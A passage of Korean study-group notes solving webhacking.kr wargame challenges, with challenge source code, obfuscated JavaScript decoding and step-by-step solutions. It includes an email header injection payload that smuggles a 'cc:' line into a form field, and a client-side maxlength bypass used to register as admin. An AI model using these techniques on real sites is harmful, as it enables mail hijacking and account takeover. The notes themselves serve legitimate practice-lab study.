<span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;=</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$ip</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span>
<span class="p">{</span>
<span class="nv">$ip</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="nv">$i</span><span class="p">,</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$i</span><span class="p">),</span><span class="nv">$ip</span><span class="p">);</span>
<span class="p">}</span>

<span class="nv">$ip</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nv">$ip</span><span class="p">);</span>

<span class="nv">$ip</span><span class="o">=</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">10</span><span class="p">);</span>

<span class="o">@</span><span class="nb">mkdir</span><span class="p">(</span><span class="s2">&quot;answerip/</span><span class="si">$ip</span><span class="s2">&quot;</span><span class="p">);</span>

<span class="nv">$answer</span><span class="o">=</span><span class="nv">$ip</span><span class="o">*</span><span class="mi">2</span><span class="p">;</span>
<span class="nv">$answer</span><span class="o">=</span><span class="nv">$ip</span><span class="o">/</span><span class="mi">2</span><span class="p">;</span>
<span class="nv">$answer</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nv">$answer</span><span class="p">);</span>

<span class="nv">$pw</span><span class="o">=</span><span class="s2">&quot;###&quot;</span><span class="p">;</span>

<span class="nv">$f</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;answerip/</span><span class="si">$ip</span><span class="s2">/</span><span class="si">$answer</span><span class="s2">.</span><span class="si">$ip</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span><span class="s2">&quot;Password is </span><span class="si">$pw\n\nclear</span><span class="s2"> ip : </span><span class="si">$_SERVER[REMOTE_ADDR]</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="nb">fclose</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>




<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>

<p>공인 IP 주소 받아다가 지지고 볶아서 나온 값을 기반으로, 파일을 하나 만들고(<code>/answerip/$ip값/$answer값.$ip값</code>), 그곳에 최종 플래그 값을 찍는 것 같다.
일일이 해석하기는 귀찮고... 조금 수정해다가 실행해서 <code>answer</code> 와 <code>ip</code> 값을 알아내 보자. <a href="http://webhacking.kr/pds/phppad/index.php">webhacking.kr PHP PAD</a> 나 <a href="http://codepad.org/">Codepad</a> 등을 이용해서 코드를 실행 할 수 있다. 다음과 같이 수정하여 실행해서 값을 알아내 보자.</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?</span>

<span class="nv">$ip</span><span class="o">=</span><span class="s2">&quot;본인의 공인IP&quot;</span><span class="p">;</span>

<span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;=</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$ip</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span>
<span class="p">{</span>
<span class="nv">$ip</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="nv">$i</span><span class="p">,</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$i</span><span class="p">),</span><span class="nv">$ip</span><span class="p">);</span>
<span class="p">}</span>

<span class="nv">$ip</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nv">$ip</span><span class="p">);</span>

<span class="nv">$ip</span><span class="o">=</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">10</span><span class="p">);</span>

<span class="k">echo</span> <span class="s2">&quot;IP : </span><span class="si">$ip</span><span class="s2"> &quot;</span><span class="p">;</span>

<span class="nv">$answer</span><span class="o">=</span><span class="nv">$ip</span><span class="o">*</span><span class="mi">2</span><span class="p">;</span>
<span class="nv">$answer</span><span class="o">=</span><span class="nv">$ip</span><span class="o">/</span><span class="mi">2</span><span class="p">;</span>
<span class="nv">$answer</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nv">$answer</span><span class="p">);</span>

<span class="k">echo</span> <span class="s2">&quot;ANSWER : </span><span class="si">$answer</span><span class="s2"> &quot;</span><span class="p">;</span>

<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>

<p>코드를 실행하면 아래와 같이 값이 찍힌다.</p>
<div class="codehilite"><pre><span></span>IP : ???????? ANSWER : ????????
</pre></div>

<p>이제 이 값을 <code>/answerip/$ip값/$answer값.$ip값</code> 에 그대로 대입하여 주소창에 넣어보자.</p>
<div class="codehilite"><pre><span></span>http://webhacking.kr/challenge/bonus/bonus-6/answerip/$ip값/$answer값.$ip값
</pre></div>

<p>화면에 나타나는 플래그를 <code>Auth</code> 에 제출하면 문제가 풀린다.</p>
<h3 id="47">47번 문제<a class="headerlink" href="#47" title="Permanent link">&para;</a></h3>
<ul>
<li><code>burpsuite</code> 툴의 <code>proxy</code> 기능을 사용해서 이메일 입력 후 제출을 눌렀을 때 넘어가는 패킷을 잡는다.</li>
<li><code>email= ...</code> 형태로 입력한 메일이 전송됨을 알 수 있다.</li>
<li>이메일의 참조 기능을 이용하여 전송되는 메일이 나에게도 전송되도록 시도한다.</li>
<li>참조 메일 주소는 <code>cc: ...</code> 혹은 <code>bcc: ...</code> 형태로 전송된다.</li>
<li>따라서 <code>email= bb@slfjl (줄바꿈) cc: hacker@webhacking.kr</code> 과 같은 형식으로 코드를 수정해서 넘겨주면 패스워드 값이 나온다.</li>
<li><code>auth</code> 에 입력해주면 문제가 풀린다.</li>
</ul>
<h2 id="6">6주차 모임<a class="headerlink" href="#6" title="Permanent link">&para;</a></h2>
<ul>
<li>2016.12.05</li>
<li>참석자 : 한나라, 김지연, 박지선, 한영빈, 송지은</li>
<li>결석 :</li>
<li>푼 문제</li>
<li>김지연 : 60</li>
<li>박지선 : 52</li>
<li>한나라 :</li>
<li>한영빈 : 5</li>
<li>송지은 : 34</li>
</ul>
<h3 id="5_1">5번 문제<a class="headerlink" href="#5_1" title="Permanent link">&para;</a></h3>
<ul>
<li>문제를 들어가면 두 가지 버튼이 보인다. <code>Login</code> 과 <code>Join</code></li>
<li><code>Login</code> 을 누르면, 로그인 화면이 나오고, <code>Join</code> 버튼은 그냥 작동하지 않고 <em>Access_Denied</em> 만 나온다.</li>
<li>로그인 화면에서 로그인을 시도 해 보자. 본인의 ID 에 비밀번호 아무거나 입력해서 시도 해 보면 다음과 같은 메시지가 나온다.</li>
</ul>
<blockquote>
<p>Access Denied! <br />
id is not admin</p>
</blockquote>
<ul>
<li><code>admin</code> 를 입력하고 비밀번호 아무거나 입력하면, 아래와 같은 메시지가 나온다.</li>
</ul>
<blockquote>
<p>Wrong password   </p>
</blockquote>
<ul>
<li>Join 버튼을 누르면 나와야 할 회원가입 페이지로 가 보자. 버튼도 안 먹고 주소도 모르는 데 어떻게 가냐고? 일단 추측을 해 보자.</li>
<li>로그인 페이지는 뒤에 붙는 경로가 <code>/mem/login.php</code> 이므로, 회원가입 페이지는 경로가 <code>/mem/join.php</code> 임을 추측해서 들어가 보자.</li>
</ul>
<div class="codehilite"><pre><span></span>http://webhacking.kr/challenge/web/web-05/mem/login.php
</pre></div>

<ul>
<li>주소가 올바른 것 같다. 일단 빈 페이지가 나오는데, 페이지 소스를 보면 아래와 같다.</li>
</ul>
<div class="codehilite"><pre><span></span><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Challenge 5<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;&lt;/</span><span class="nt">head</span><span class="p">&gt;&lt;</span><span class="nt">body</span> <span class="na">bgcolor</span><span class="o">=</span><span class="s">black</span><span class="p">&gt;&lt;</span><span class="nt">center</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="nx">l</span><span class="o">=</span><span class="s1">&#39;a&#39;</span><span class="p">;</span><span class="nx">ll</span><span class="o">=</span><span class="s1">&#39;b&#39;</span><span class="p">;</span><span class="nx">lll</span><span class="o">=</span><span class="s1">&#39;c&#39;</span><span class="p">;</span><span class="nx">llll</span><span class="o">=</span><span class="s1">&#39;d&#39;</span><span class="p">;</span><span class="nx">lllll</span><span class="o">=</span><span class="s1">&#39;e&#39;</span><span class="p">;</span><span class="nx">llllll</span><span class="o">=</span><span class="s1">&#39;f&#39;</span><span class="p">;</span><span class="nx">lllllll</span><span class="o">=</span><span class="s1">&#39;g&#39;</span><span class="p">;</span><span class="nx">llllllll</span><span class="o">=</span><span class="s1">&#39;h&#39;</span><span class="p">;</span><span class="nx">lllllllll</span><span class="o">=</span><span class="s1">&#39;i&#39;</span><span class="p">;</span><span class="nx">llllllllll</span><span class="o">=</span><span class="s1">&#39;j&#39;</span><span class="p">;</span><span class="nx">lllllllllll</span><span class="o">=</span><span class="s1">&#39;k&#39;</span><span class="p">;</span><span class="nx">llllllllllll</span><span class="o">=</span><span class="s1">&#39;l&#39;</span><span class="p">;</span><span class="nx">lllllllllllll</span><span class="o">=</span><span class="s1">&#39;m&#39;</span><span class="p">;</span><span class="nx">llllllllllllll</span><span class="o">=</span><span class="s1">&#39;n&#39;</span><span class="p">;</span><span class="nx">lllllllllllllll</span><span class="o">=</span><span class="s1">&#39;o&#39;</span><span class="p">;</span><span class="nx">llllllllllllllll</span><span class="o">=</span><span class="s1">&#39;p&#39;</span><span class="p">;</span><span class="nx">lllllllllllllllll</span><span class="o">=</span><span class="s1">&#39;q&#39;</span><span class="p">;</span><span class="nx">llllllllllllllllll</span><span class="o">=</span><span class="s1">&#39;r&#39;</span><span class="p">;</span><span class="nx">lllllllllllllllllll</span><span class="o">=</span><span class="s1">&#39;s&#39;</span><span class="p">;</span><span class="nx">llllllllllllllllllll</span><span class="o">=</span><span class="s1">&#39;t&#39;</span><span class="p">;</span><span class="nx">lllllllllllllllllllll</span><span class="o">=</span><span class="s1">&#39;u&#39;</span><span class="p">;</span><span class="nx">llllllllllllllllllllll</span><span class="o">=</span><span class="s1">&#39;v&#39;</span><span class="p">;</span><span class="nx">lllllllllllllllllllllll</span><span class="o">=</span><span class="s1">&#39;w&#39;</span><span class="p">;</span><span class="nx">llllllllllllllllllllllll</span><span class="o">=</span><span class="s1">&#39;x&#39;</span><span class="p">;</span><span class="nx">lllllllllllllllllllllllll</span><span class="o">=</span><span class="s1">&#39;y&#39;</span><span class="p">;</span><span class="nx">llllllllllllllllllllllllll</span><span class="o">=</span><span class="s1">&#39;z&#39;</span><span class="p">;</span><span class="nx">I</span><span class="o">=</span><span class="s1">&#39;1&#39;</span><span class="p">;</span><span class="nx">II</span><span class="o">=</span><span class="s1">&#39;2&#39;</span><span class="p">;</span><span class="nx">III</span><span class="o">=</span><span class="s1">&#39;3&#39;</span><span class="p">;</span><span class="nx">IIII</span><span class="o">=</span><span class="s1">&#39;4&#39;</span><span class="p">;</span><span class="nx">IIIII</span><span class="o">=</span><span class="s1">&#39;5&#39;</span><span class="p">;</span><span class="nx">IIIIII</span><span class="o">=</span><span class="s1">&#39;6&#39;</span><span class="p">;</span><span class="nx">IIIIIII</span><span class="o">=</span><span class="s1">&#39;7&#39;</span><span class="p">;</span><span class="nx">IIIIIIII</span><span class="o">=</span><span class="s1">&#39;8&#39;</span><span class="p">;</span><span class="nx">IIIIIIIII</span><span class="o">=</span><span class="s1">&#39;9&#39;</span><span class="p">;</span><span class="nx">IIIIIIIIII</span><span class="o">=</span><span class="s1">&#39;0&#39;</span><span class="p">;</span><span class="nx">li</span><span class="o">=</span><span class="s1">&#39;.&#39;</span><span class="p">;</span><span class="nx">ii</span><span class="o">=</span><span class="s1">&#39;&lt;&#39;</span><span class="p">;</span><span class="nx">iii</span><span class="o">=</span><span class="s1">&#39;&gt;&#39;</span><span class="p">;</span><span class="nx">lIllIllIllIllIllIllIllIllIllIl</span><span class="o">=</span><span class="nx">lllllllllllllll</span><span class="o">+</span><span class="nx">llllllllllll</span><span class="o">+</span><span class="nx">llll</span><span class="o">+</span><span class="nx">llllllllllllllllllllllllll</span><span class="o">+</span><span class="nx">lllllllllllllll</span><span class="o">+</span><span class="nx">lllllllllllll</span><span class="o">+</span><span class="nx">ll</span><span class="o">+</span><span class="nx">lllllllll</span><span class="o">+</span><span class="nx">lllll</span><span class="p">;</span>
<span class="nx">lIIIIIIIIIIIIIIIIIIl</span><span class="o">=</span><span class="nx">llll</span><span class="o">+</span><span class="nx">lllllllllllllll</span><span class="o">+</span><span class="nx">lll</span><span class="o">+</span><span class="nx">lllllllllllllllllllll</span><span class="o">+</span><span class="nx">lllllllllllll</span><span class="o">+</span><span class="nx">lllll</span><span class="o">+</span><span class="nx">llllllllllllll</span><span class="o">+</span><span class="nx">llllllllllllllllllll</span><span class="o">+</span><span class="nx">li</span><span class="o">+</span><span class="nx">lll</span><span class="o">+</span><span class="nx">lllllllllllllll</span><span class="o">+</span><span class="nx">lllllllllllllll</span><span class="o">+</span><span class="nx">lllllllllll</span><span class="o">+</span><span class="nx">lllllllll</span><span class="o">+</span><span class="nx">lllll</span><span class="p">;</span><span class="k">if</span><span class="p">(</span><span class="nb">eval</span><span class="p">(</span><span class="nx">lIIIIIIIIIIIIIIIIIIl</span><span class="p">).</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">lIllIllIllIllIllIllIllIllIllIl</span><span class="p">)</span><span class="o">==-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span> <span class="nx">bye</span><span class="p">;</span> <span class="p">}</span><span class="k">if</span><span class="p">(</span><span class="nb">eval</span><span class="p">(</span><span class="nx">llll</span><span class="o">+</span><span class="nx">lllllllllllllll</span><span class="o">+</span><span class="nx">lll</span><span class="o">+</span><span class="nx">lllllllllllllllllllll</span><span class="o">+</span><span class="nx">lllllllllllll</span><span class="o">+</span><span class="nx">lllll</span><span class="o">+</span><span class="nx">llllllllllllll</span><span class="o">+</span><span class="nx">llllllllllllllllllll</span><span class="o">+</span><span class="nx">li</span><span class="o">+</span><span class="s1">&#39;U&#39;</span><span class="o">+</span><span class="s1">&#39;R&#39;</span><span class="o">+</span><span class="s1">&#39;L&#39;</span><span class="p">).</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">lllllllllllll</span><span class="o">+</span><span class="nx">lllllllllllllll</span><span class="o">+</span><span class="nx">llll</span><span class="o">+</span><span class="nx">lllll</span><span class="o">+</span><span class="s1">&#39;=&#39;</span><span class="o">+</span><span class="nx">I</span><span class="p">)</span><span class="o">==-</span><span class="mi">1</span><span class="p">){</span><span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;access_denied&#39;</span><span class="p">);</span><span class="nx">history</span><span class="p">.</span><span class="nx">go</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);}</span><span class="k">else</span><span class="p">{</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;&lt;font size=2 color=white&gt;Join&lt;/font&gt;&lt;p&gt;&#39;</span><span class="p">);</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;.&lt;p&gt;.&lt;p&gt;.&lt;p&gt;.&lt;p&gt;.&lt;p&gt;&#39;</span><span class="p">);</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;&lt;form method=post action=&#39;</span><span class="o">+</span><span class="nx">llllllllll</span><span class="o">+</span><span class="nx">lllllllllllllll</span><span class="o">+</span><span class="nx">lllllllll</span><span class="o">+</span><span class="nx">llllllllllllll</span><span class="o">+</span><span class="nx">li</span><span class="o">+</span><span class="nx">llllllllllllllll</span><span class="o">+</span><span class="nx">llllllll</span><span class="o">+</span><span class="nx">llllllllllllllll</span>
<span class="o">+</span><span class="s1">&#39;&gt;&#39;</span><span class="p">);</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;&lt;table border=1&gt;&lt;tr&gt;&lt;td&gt;&lt;font color=gray&gt;id&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=text name=&#39;</span><span class="o">+</span><span class="nx">lllllllll</span><span class="o">+</span><span class="nx">llll</span><span class="o">+</span><span class="s1">&#39; maxlength=5&gt;&lt;/td&gt;&lt;/tr&gt;&#39;</span><span class="p">);</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;&lt;tr&gt;&lt;td&gt;&lt;font color=gray&gt;pass&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=text name=&#39;</span><span class="o">+</span><span class="nx">llllllllllllllll</span><span class="o">+</span><span class="nx">lllllllllllllllllllllll</span><span class="o">+</span><span class="s1">&#39; maxlength=10&gt;&lt;/td&gt;&lt;/tr&gt;&#39;</span><span class="p">);</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;&lt;tr align=center&gt;&lt;td colspan=2&gt;&lt;input type=submit&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&#39;</span><span class="p">);}</span>
<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</pre></div>

<ul>
<li>페이지 소스를 보면 난독화된 Javascript 소스가 들어가 있는 것을 볼 수 있다. 중간에 <code>document.write()</code> 함수가 있고, 조건문으로 감싸져 있는 것으로 보아, 특정 조건을 만족하면 페이지에 내용이 나타남을 알 수 있다.</li>
<li>난독화된 코드를 일일이 해독할 필요는 없고, 필요한 부분만 웹 브라우저에 내장된 개발자 도구의 자바스크립트 콘솔에서 실행해 보면 된다.</li>
<li>먼저 조건문 이전 부분의 코드를 실행해 보자. 해당 부분은 아래와 같다.</li>
</ul>
<p><div class="codehilite"><pre><span></span><span class="nx">l</span><span class="o">=</span><span class="s1">&#39;a&#39;</span><span class="p">;</span><span class="nx">ll</span><span class="o">=</span><span class="s1">&#39;b&#39;</span><span class="p">;</span><span class="nx">lll</span><span class="o">=</span><span class="s1">&#39;c&#39;</span><span class="p">;</span><span class="nx">llll</span><span class="o">=</span><span class="s1">&#39;d&#39;</span><span class="p">;</span><span class="nx">lllll</span><span class="o">=</span><span class="s1">&#39;e&#39;</span><span class="p">;</span><span class="nx">llllll</span><span class="o">=</span><span class="s1">&#39;f&#39;</span><span class="p">;</span><span class="nx">lllllll</span><span class="o">=</span><span class="s1">&#39;g&#39;</span><span class="p">;</span><span class="nx">llllllll</span><span class="o">=</span><span class="s1">&#39;h&#39;</span><span class="p">;</span><span class="nx">lllllllll</span><span class="o">=</span><span class="s1">&#39;i&#39;</span><span class="p">;</span><span class="nx">llllllllll</span><span class="o">=</span><span class="s1">&#39;j&#39;</span><span class="p">;</span><span class="nx">lllllllllll</span><span class="o">=</span><span class="s1">&#39;k&#39;</span><span class="p">;</span><span class="nx">llllllllllll</span><span class="o">=</span><span class="s1">&#39;l&#39;</span><span class="p">;</span><span class="nx">lllllllllllll</span><span class="o">=</span><span class="s1">&#39;m&#39;</span><span class="p">;</span><span class="nx">llllllllllllll</span><span class="o">=</span><span class="s1">&#39;n&#39;</span><span class="p">;</span><span class="nx">lllllllllllllll</span><span class="o">=</span><span class="s1">&#39;o&#39;</span><span class="p">;</span><span class="nx">llllllllllllllll</span><span class="o">=</span><span class="s1">&#39;p&#39;</span><span class="p">;</span><span class="nx">lllllllllllllllll</span><span class="o">=</span><span class="s1">&#39;q&#39;</span><span class="p">;</span><span class="nx">llllllllllllllllll</span><span class="o">=</span><span class="s1">&#39;r&#39;</span><span class="p">;</span><span class="nx">lllllllllllllllllll</span><span class="o">=</span><span class="s1">&#39;s&#39;</span><span class="p">;</span><span class="nx">llllllllllllllllllll</span><span class="o">=</span><span class="s1">&#39;t&#39;</span><span class="p">;</span><span class="nx">lllllllllllllllllllll</span><span class="o">=</span><span class="s1">&#39;u&#39;</span><span class="p">;</span><span class="nx">llllllllllllllllllllll</span><span class="o">=</span><span class="s1">&#39;v&#39;</span><span class="p">;</span><span class="nx">lllllllllllllllllllllll</span><span class="o">=</span><span class="s1">&#39;w&#39;</span><span class="p">;</span><span class="nx">llllllllllllllllllllllll</span><span class="o">=</span><span class="s1">&#39;x&#39;</span><span class="p">;</span><span class="nx">lllllllllllllllllllllllll</span><span class="o">=</span><span class="s1">&#39;y&#39;</span><span class="p">;</span><span class="nx">llllllllllllllllllllllllll</span><span class="o">=</span><span class="s1">&#39;z&#39;</span><span class="p">;</span><span class="nx">I</span><span class="o">=</span><span class="s1">&#39;1&#39;</span><span class="p">;</span><span class="nx">II</span><span class="o">=</span><span class="s1">&#39;2&#39;</span><span class="p">;</span><span class="nx">III</span><span class="o">=</span><span class="s1">&#39;3&#39;</span><span class="p">;</span><span class="nx">IIII</span><span class="o">=</span><span class="s1">&#39;4&#39;</span><span class="p">;</span><span class="nx">IIIII</span><span class="o">=</span><span class="s1">&#39;5&#39;</span><span class="p">;</span><span class="nx">IIIIII</span><span class="o">=</span><span class="s1">&#39;6&#39;</span><span class="p">;</span><span class="nx">IIIIIII</span><span class="o">=</span><span class="s1">&#39;7&#39;</span><span class="p">;</span><span class="nx">IIIIIIII</span><span class="o">=</span><span class="s1">&#39;8&#39;</span><span class="p">;</span><span class="nx">IIIIIIIII</span><span class="o">=</span><span class="s1">&#39;9&#39;</span><span class="p">;</span><span class="nx">IIIIIIIIII</span><span class="o">=</span><span class="s1">&#39;0&#39;</span><span class="p">;</span><span class="nx">li</span><span class="o">=</span><span class="s1">&#39;.&#39;</span><span class="p">;</span><span class="nx">ii</span><span class="o">=</span><span class="s1">&#39;&lt;&#39;</span><span class="p">;</span><span class="nx">iii</span><span class="o">=</span><span class="s1">&#39;&gt;&#39;</span><span class="p">;</span><span class="nx">lIllIllIllIllIllIllIllIllIllIl</span><span class="o">=</span><span class="nx">lllllllllllllll</span><span class="o">+</span><span class="nx">llllllllllll</span><span class="o">+</span><span class="nx">llll</span><span class="o">+</span><span class="nx">llllllllllllllllllllllllll</span><span class="o">+</span><span class="nx">lllllllllllllll</span><span class="o">+</span><span class="nx">lllllllllllll</span><span class="o">+</span><span class="nx">ll</span><span class="o">+</span><span class="nx">lllllllll</span><span class="o">+</span><span class="nx">lllll</span><span class="p">;</span>
<span class="nx">lIIIIIIIIIIIIIIIIIIl</span><span class="o">=</span><span class="nx">llll</span><span class="o">+</span><span class="nx">lllllllllllllll</span><span class="o">+</span><span class="nx">lll</span><span class="o">+</span><span class="nx">lllllllllllllllllllll</span><span class="o">+</span><span class="nx">lllllllllllll</span><span class="o">+</span><span class="nx">lllll</span><span class="o">+</span><span class="nx">llllllllllllll</span><span class="o">+</span><span class="nx">llllllllllllllllllll</span><span class="o">+</span><span class="nx">li</span><span class="o">+</span><span class="nx">lll</span><span class="o">+</span><span class="nx">lllllllllllllll</span><span class="o">+</span><span class="nx">lllllllllllllll</span><span class="o">+</span><span class="nx">lllllllllll</span><span class="o">+</span><span class="nx">lllllllll</span><span class="o">+</span><span class="nx">lllll</span><span class="p">;</span>
</pre></div>
- 실행 결과로 다음과 같은 것이 나오는데, 이는 코드에서 가장 마지막 구문이 실행된 것의 결과이다. 결과는 <code>documents.cookie</code> 라는 문자열 인 것 으로 보인다.</p>
<div class="codehilite"><pre><span></span><span class="s2">&quot;document.cookie&quot;</span>
</pre></div>

<ul>
<li>이번에는 조건문의 마지막 부분에 있는 페이지에 내용을 삽입하는 코드를 실행해 보자. 해당 부분은 아래와 같다.</li>
</ul>
<div class="codehilite"><pre><span></span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;&lt;font size=2 color=white&gt;Join&lt;/font&gt;&lt;p&gt;&#39;</span><span class="p">);</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;.&lt;p&gt;.&lt;p&gt;.&lt;p&gt;.&lt;p&gt;.&lt;p&gt;&#39;</span><span class="p">);</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;&lt;form method=post action=&#39;</span><span class="o">+</span><span class="nx">llllllllll</span><span class="o">+</span><span class="nx">lllllllllllllll</span><span class="o">+</span><span class="nx">lllllllll</span><span class="o">+</span><span class="nx">llllllllllllll</span><span class="o">+</span><span class="nx">li</span><span class="o">+</span><span class="nx">llllllllllllllll</span><span class="o">+</span><span class="nx">llllllll</span><span class="o">+</span><span class="nx">llllllllllllllll</span>
<span class="o">+</span><span class="s1">&#39;&gt;&#39;</span><span class="p">);</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;&lt;table border=1&gt;&lt;tr&gt;&lt;td&gt;&lt;font color=gray&gt;id&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=text name=&#39;</span><span class="o">+</span><span class="nx">lllllllll</span><span class="o">+</span><span class="nx">llll</span><span class="o">+</span><span class="s1">&#39; maxlength=5&gt;&lt;/td&gt;&lt;/tr&gt;&#39;</span><span class="p">);</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;&lt;tr&gt;&lt;td&gt;&lt;font color=gray&gt;pass&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=text name=&#39;</span><span class="o">+</span><span class="nx">llllllllllllllll</span><span class="o">+</span><span class="nx">lllllllllllllllllllllll</span><span class="o">+</span><span class="s1">&#39; maxlength=10&gt;&lt;/td&gt;&lt;/tr&gt;&#39;</span><span class="p">);</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;&lt;tr align=center&gt;&lt;td colspan=2&gt;&lt;input type=submit&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&#39;</span><span class="p">);</span>
</pre></div>

<ul>
<li>그리고 나서, 페이지를 보면 회원 가입 입력 폼이 하나 나타나 있는 것을 볼 수 있다.</li>
<li>본인이 원하는 데로 대충 채워넣고 제출하면, 가입 잘 되었다고 <code>Done!</code> 과 함꼐 입력한 것이 나오는 것을 볼 수 있다.</li>
<li><code>admin</code> 과 본인이 원하는 비밀번호를 입력하면, 이미 존재한다고 나온다.</li>
</ul>
<blockquote>
<p>id 'admin' is already exists   </p>
</blockquote>
<ul>
<li>그렇다면, <code>admin</code> 이라는 id 로 가입을 해 보자. 참고로 id 입력칸은 최대 5자까지만 입력 되는 상태이다.</li>
<li>개발자 콘솔을 열어 요소 검사기를 열고, 해당 입력칸 부분을 보자.</li>
</ul>
<div class="codehilite"><pre><span></span><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;id&quot;</span> <span class="na">maxlength</span><span class="o">=</span><span class="s">&quot;5&quot;</span><span class="p">&gt;</span>
</pre></div>

<ul>
<li>입력 길이가 최대 5로 설정 되어 있음을 볼 수 있다. <code>maxlength=&quot;5&quot;</code> 부분을 더블클릭해서 6 이상의 값으로 고친다. 대부분의 웹 브라우저에서는 바로 고쳐서 페이지에 적용이 가능하다.</li>
<li>이제 id 에 <code>admin</code> 을, pass 에는 본인이 원하는 것으로 입력한다. 필자는 <code>1111</code> 로 입력하겠다. 그리고 제출하면 다음과 같은 내용이 나타난다.</li>
</ul>
<blockquote>
<p>sign up   </p>
</blockquote>
<ul>
<li>이제 다시 로그인 페이지로 이동해서, 방금 제출한 것으로 로그인 해 보자. 필자의 경우는 <code>admin</code> 과 <code>1111</code> 을 입력하였다.</li>
<li>문제가 풀리는 것을 볼 수 있다.</li>
</ul>
<h3 id="34">34번 문제<a class="headerlink" href="#34" title="Permanent link">&para;</a></h3>
<ul>
<li>개발자도구로 소스코드를 확인한다.</li>
<li>복잡한 코드 무시하고 끝 부분 소스코드를 확인하면 아래와 같이 써있다.
<div class="codehilite"><pre><span></span>if(document.URL.indexOf(&#39;0lDz0mBi2&#39;)!=-1){location.href=&#39;Passw0RRdd.pww&#39;;}else{alert(&#39;Wrong&#39;);}
</pre></div></li>
<li>조건문이 참이 될 경우 <code>Passw0RRdd.pww</code> 주소로 들어감을 알 수 있다.</li>
<li><code>http://webhacking.kr/challenge/javascript/Passw0RRdd.pww</code> URL에 그냥 바로 주소를 적어준다.</li>
<li>나오는 패스워드를 <code>Auth</code>에 적어주면 문제가 풀린다.</li>
</ul>
<h3 id="52">52번 문제<a class="headerlink" href="#52" title="Permanent link">&para;</a></h3>
<ol>
<li>일단 보아하니 Header injection 문제 인 것 같다.</li>
<li>우선 헤더 생성을 눌러보니 헤더에?id=sgs04023하고 정보가 추가되며, response 헤더에도 id: sgs04023하고 내 아이디가 추가되었다.</li>
